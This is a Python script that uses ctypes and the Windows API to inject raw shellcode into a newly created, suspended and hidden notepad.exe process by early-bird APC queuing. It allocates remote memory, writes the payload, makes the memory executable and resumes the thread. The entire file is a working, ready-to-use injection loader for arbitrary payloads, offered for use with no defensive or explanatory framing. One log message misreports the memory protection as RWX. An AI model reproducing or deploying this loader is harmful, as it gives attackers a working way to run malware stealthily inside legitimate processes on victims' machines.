import os
import logging
from ctypes import *
from ctypes import wintypes

INJECT_PATH = b"C:\\Windows\\System32\\notepad.exe" # change this line
INJECT_NAME = os.path.basename(INJECT_PATH.decode("utf-8"))

### Put your raw shellcode in this file ###
with open("shellcode", "rb") as shellcode:
    buf = create_string_buffer(shellcode.read())
    buf_size = len(buf)


logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s: %(message)s'
)
logger = logging.getLogger(__name__)

kernel32 = windll.kernel32
SIZE_T = c_size_t
LPTSTR = POINTER(c_char)
LPBYTE = POINTER(c_ubyte)


class _SECURITY_ATTRIBUTES(Structure):
    _fields_ = [
        ('nLength', wintypes.DWORD),
        ('lpSecurityDescriptor', wintypes.LPVOID),
        ('bInheritHandle', wintypes.BOOL)
    ]


class _STARTUPINFOA(Structure):
    _fields_ = [
        ('cb', wintypes.DWORD),
        ('lpReserved', LPTSTR),
        ('lpDesktop', LPTSTR),
        ('lpTitle', LPTSTR),
        ('dwX', wintypes.DWORD),
        ('dwY', wintypes.DWORD),
        ('dwXSize', wintypes.DWORD),
        ('dwYSize', wintypes.DWORD),
        ('dwXCountChars', wintypes.DWORD),
        ('dwYCountChars', wintypes.DWORD),
        ('dwFillAttribute', wintypes.DWORD),
        ('dwFlags', wintypes.DWORD),
        ('wShowWindow', wintypes.WORD),
        ('cbReserved2', wintypes.WORD),
        ('lpReserved2', LPBYTE),
        ('hStdInput', wintypes.HANDLE),
        ('hStdOutput', wintypes.HANDLE),
        ('hStdError', wintypes.HANDLE),
    ]


class _PROCESS_INFORMATION(Structure):
    _fields_ = [
        ('hProcess', wintypes.HANDLE),
        ('hThread', wintypes.HANDLE),
        ('dwProcessId', wintypes.DWORD),
        ('dwThreadId', wintypes.DWORD)
    ]
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04
CREATE_NO_WINDOW = 0x08000000
CREATE_SUSPENDED = 0x00000004
PAGE_EXECUTE_READ = 0x20
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0x00000FFF)
CREATE_NEW_CONSOLE = 0x00000010
EXECUTE_IMMEDIATELY = 0x0

LPSTARTUPINFOA = POINTER(_STARTUPINFOA)
LPPROCESS_INFORMATION = POINTER(_PROCESS_INFORMATION)
LPSECURITY_ATTRIBUTES = POINTER(_SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = wintypes.LPVOID

PAPCFUNC = CFUNCTYPE(
    None,
    POINTER(wintypes.ULONG)
)


CreateProcessA = kernel32.CreateProcessA
CreateProcessA.argtypes = (
    wintypes.LPCSTR,
    LPTSTR,
    LPSECURITY_ATTRIBUTES,
    LPSECURITY_ATTRIBUTES,
    wintypes.BOOL,
    wintypes.DWORD,
    wintypes.LPVOID,
    wintypes.LPCSTR,
    LPSTARTUPINFOA,
    LPPROCESS_INFORMATION
)
CreateProcessA.restype = wintypes.BOOL


QueueUserAPC = kernel32.QueueUserAPC
QueueUserAPC.argtypes = (
    PAPCFUNC,
    wintypes.HANDLE,
    POINTER(wintypes.ULONG)
)
QueueUserAPC.restype = wintypes.BOOL


ResumeThread = kernel32.ResumeThread
ResumeThread.argtypes = (
    wintypes.HANDLE, 
)
ResumeThread.restype = wintypes.BOOL

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = (
    wintypes.HANDLE,
    wintypes.LPVOID,
    SIZE_T,
    wintypes.DWORD,
    wintypes.DWORD
)
VirtualAllocEx.restype = wintypes.LPVOID


VirtualProtectEx = kernel32.VirtualProtectEx
VirtualProtectEx.argtypes = (
    wintypes.HANDLE,
    wintypes.LPVOID,
    SIZE_T,
    wintypes.DWORD,
    wintypes.LPDWORD
)
VirtualProtectEx.restype = wintypes.BOOL


WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = (
    wintypes.HANDLE,
    wintypes.LPVOID,
    wintypes.LPCVOID,
    SIZE_T,
    POINTER(SIZE_T)
)
WriteProcessMemory.restype = wintypes.BOOL


startup_info = _STARTUPINFOA()
startup_info.cb = sizeof(startup_info)
startup_info.dwFlags = 1
startup_info.wShowWindow = 0


process_info = _PROCESS_INFORMATION()
process = CreateProcessA(
    INJECT_PATH,
    None,
    None,
    None,
    False,
    CREATE_SUSPENDED | CREATE_NO_WINDOW,
    None,
    None,
    byref(startup_info),
    byref(process_info)
)
process_id = process_info.dwProcessId
h_process = process_info.hProcess
h_thread = process_info.hThread
thread_id = process_info.dwThreadId

logger.info("Started process '{}' HANDLE: {} PID: {} TID: {}"
    .format(INJECT_NAME, h_process, process_id, thread_id)
)

memory_addr = VirtualAllocEx(
    h_process,
    False,
    buf_size,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE,
)
logger.info("Allocated {} bytes to PID: {} at {}"
    .format(buf_size, process_id, hex(memory_addr))
)

WriteProcessMemory(
    h_process,
    memory_addr,
    buf,
    buf_size,
    None
)

logger.info("Wrote {} bytes to PID: {} at {}"
    .format(buf_size, process_id, hex(memory_addr))
)

VirtualProtectEx(
    h_process,
    memory_addr,
    buf_size,
    PAGE_EXECUTE_READ,
    byref(wintypes.DWORD(0))
)

logger.info("Updated memory protection for {} to RWX"
    .format(hex(memory_addr))
)


rqueue = QueueUserAPC(
    PAPCFUNC(memory_addr),
    h_thread,
    None
)

logger.info("Queued APC thread. HANDLE: {} PID: {}"
    .format(h_thread, process_id)
)

ResumeThread(
    h_thread
)

logger.info("Resuming APC thread. HANDLE: {} PID: {}."
    .format(h_thread, process_id)
)
